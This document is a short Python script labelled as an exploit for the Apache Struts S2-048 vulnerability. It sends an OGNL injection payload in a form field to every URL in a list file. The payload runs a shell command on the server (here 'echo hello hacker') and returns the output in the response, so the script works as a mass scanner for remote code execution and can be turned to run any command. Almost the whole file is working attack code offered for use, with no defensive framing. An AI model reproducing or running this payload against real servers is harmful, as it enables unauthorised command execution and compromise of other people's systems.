#!/usr/bin/env python
# -*- coding:utf-8 -*-
# code：mr.tcsy 

'''s2-048 exp'''


import requests
#import httplib
from  requests import exceptions

#httplib.HTTPConnection._http_vsn = 10 
#httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0' 

def main():
	data = {'name':"${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='echo hello hacker').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", 'age':'bbb', '__checkbox_bustedBefore':'true', 'description':'ccc'}
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"}
	f = open("url.txt","r")
	lines=f.readlines()
        for url in lines:
		try:
			response = requests.post(url, data,timeout=0.10) 
			#print response.headers
			#print response.text
		except exceptions.Timeout as e:
			print "Error:"+ url
		except exceptions.RequestException  as e:
			print "Error:"+ url
		else:
			poc = response.text
			if 'hacker' in poc:
				print "Yes:"+ url
			else:
				print "No:"+ url
	f.close()
			
if __name__ == '__main__':
        main()
